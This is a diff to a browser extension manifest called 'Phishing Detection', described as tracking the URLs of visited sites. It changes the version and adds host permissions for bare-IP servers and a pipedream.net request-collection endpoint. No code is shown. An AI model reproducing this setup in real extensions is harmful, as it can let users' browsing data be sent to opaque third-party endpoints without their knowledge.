@@ -1,6 +1,6 @@
 {
   "name": "Phishing Detection",
-  "version": "25.0",
+  "version": "69.0",
   "manifest_version": 3,
   "description": "Tracks the URL of websites you visit",
   "permissions": [
@@ -10,7 +10,10 @@
     "downloads"
   ],
   "host_permissions": [
-    "http://139.59.63.119:4000/api"
+    "http://139.59.81.140:4000/api",
+    "http://139.59.81.140:4000/",
+    "http://139.59.81.140/",
+    "https://eokdhydqf6vxow0.m.pipedream.net/"
   ],
   "icons": {
     "16": "icon.png",
